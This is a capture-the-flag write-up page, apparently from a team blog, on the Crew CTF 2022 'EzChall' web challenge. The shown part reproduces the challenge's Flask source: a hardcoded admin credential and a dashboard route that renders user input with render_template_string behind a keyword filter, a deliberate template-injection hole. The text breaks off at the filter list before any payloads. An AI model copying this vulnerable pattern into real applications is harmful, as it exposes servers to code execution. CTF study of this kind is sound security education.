<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>Crew CTF 2022 – EzChall &amp; EzChall Again</title><meta name="robots" content="follow, index"/><meta name="description" content="Blind SSTI with filters"/><meta property="og:url" content="https://sekai.team/blog/crew-ctf-2022/EzChall/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Blind SSTI with filters"/><meta property="og:title" content="Crew CTF 2022 – EzChall &amp; EzChall Again"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=Crew+CTF+2022+%E2%80%93+EzChall+%26+EzChall+Again&amp;desc=Blind+SSTI+with+filters&amp;authors=ElleuchX1"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="Crew CTF 2022 – EzChall &amp; EzChall Again"/><meta name="twitter:description" content="Blind SSTI with filters"/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=Crew+CTF+2022+%E2%80%93+EzChall+%26+EzChall+Again&amp;desc=Blind+SSTI+with+filters&amp;authors=ElleuchX1"/><meta property="article:published_time" content="2022-04-17T00:00:00.000Z"/><link rel="canonical" href="https://sekai.team/blog/crew-ctf-2022/EzChall/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/crew-ctf-2022/EzChall"
  },
  "headline": "Crew CTF 2022 – EzChall & EzChall Again",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=Crew+CTF+2022+%E2%80%93+EzChall+%26+EzChall+Again&desc=Blind+SSTI+with+filters&authors=ElleuchX1"
    }
  ],
  "datePublished": "2022-04-17T00:00:00.000Z",
  "dateModified": "2022-04-17T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "ElleuchX1"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Blind SSTI with filters"
}</script><meta name="next-head-count" content="20"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_buildManifest.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_ssgManifest.js" defer=""></script><script src="/_next/static/0wxHpwy3ehtFejYPlY-Z7/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-04-17T00:00:00.000Z">Sunday, 17 April 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">Crew CTF 2022 – EzChall &amp; EzChall Again</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/7713c4f4229ca2e9b9291755957a2e42?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">ElleuchX1</dd><dt class="sr-only">Twitter</dt><dd><span class="text-gray-500">Yeah exactly, the HTB guy</span></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h1 id="ezchall-web-906"><a href="#ezchall-web-906" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>EzChall (Web, 906)</h1>
<blockquote>
<p>I am looking for a way out for myself, can you help me?<br/>
<!-- -->Author: Nino#5160</p>
<p><a target="_blank" rel="noopener noreferrer" href="http://ezchall.crewctf-2022.crewc.tf:1337/">http://ezchall.crewctf-2022.crewc.tf:1337/</a><br/>
<!-- -->Mirror: <a target="_blank" rel="noopener noreferrer" href="http://193.105.207.19:8005/">http://193.105.207.19:8005/</a></p>
<p>Attachment: ExChall.zip</p>
</blockquote>
<p>In this blogpost, I’ll be showcasing my thought proccess of solving these two challenges.</p>
<p>So, we’re given the source code of the application.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">src
</span><span class="code-line">    templates
</span><span class="code-line">    app.py
</span><span class="code-line">    filter.py
</span><span class="code-line">    mybase64.py
</span><span class="code-line">    requirements.txt
</span><span class="code-line">docker-compose.yml
</span><span class="code-line">Dockerfile
</span><span class="code-line">flag
</span></code></pre></div>
<p>Let’s first start by poking at <code>app.py</code> where we have 2 Routes (login/dashboard).</p>
<p>Nothing interesting in the second route other than the admin hardcoded credentials</p>
<blockquote>
<p><code>admin</code>: <code>cGFzcyBpcyBhZG1pbiA/Pw==</code></p>
</blockquote>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	<span class="token keyword">if</span> <span class="token string">&#x27;user&#x27;</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
</span><span class="code-line">		<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#x27;dashboard&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">		<span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">&quot;POST&quot;</span><span class="token punctuation">:</span>
</span><span class="code-line">			user<span class="token punctuation">,</span> passwd <span class="token operator">=</span> <span class="token string">&#x27;&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;&#x27;</span>
</span><span class="code-line">			user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">&#x27;user&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">			passwd <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">&#x27;passwd&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">			<span class="token keyword">if</span> user <span class="token operator">==</span> <span class="token string">&#x27;admin&#x27;</span> <span class="token keyword">and</span> bdecode<span class="token punctuation">(</span>passwd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&#x27;pass is admin ??&#x27;</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">24</span> <span class="token keyword">and</span> passwd <span class="token operator">!=</span> <span class="token string">&#x27;cGFzcyBpcyBhZG1pbiA/Pw==&#x27;</span><span class="token punctuation">:</span>
</span><span class="code-line">				session<span class="token punctuation">[</span><span class="token string">&#x27;user&#x27;</span><span class="token punctuation">]</span> <span class="token operator">=</span> user
</span><span class="code-line">				<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#x27;dashboard&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">			<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#x27;login.html&#x27;</span><span class="token punctuation">,</span> msg<span class="token operator">=</span><span class="token string">&#x27;Incorrect !&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">		<span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&#x27;login.html&#x27;</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>For the dashboard endpoint, we have a straightforward blind SSTI vulnerability if the we validate the checker <code>check_filter</code>.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">	<span class="token keyword">if</span> <span class="token string">&#x27;user&#x27;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
</span><span class="code-line">			<span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">&#x27;login&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">	<span class="token keyword">else</span><span class="token punctuation">:</span>
</span><span class="code-line">		<span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#x27;payload&#x27;</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
</span><span class="code-line">			payload <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#x27;payload&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">			<span class="token keyword">if</span> check_filter<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">				render_template_string<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</span><span class="code-line">			<span class="token keyword">return</span> <span class="token string">&#x27;I believe you can overcome this difficulty &gt;&lt;&#x27;</span>
</span><span class="code-line">		<span class="token keyword">return</span> <span class="token string">&#x27;miss params&#x27;</span>
</span><span class="code-line">
</span></code></pre></div>
<p>Now let’s start fun part and check how it’s validating the payload.</p>
<p>I got a bit cocky at first sight and thought this was a typical blind SSTI and rushed copying one of my go-to SSTI payloads and then noticed that <code>request</code>/<code>join</code>/<code>attr</code>/<code>print</code> was filtered and gave up on the typical payloads at this point.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">import</span> string
</span><span class="code-line">
</span><span class="code-line">UNALLOWED <span class="token operator">=</span> <span class="token punctuation">[</span>
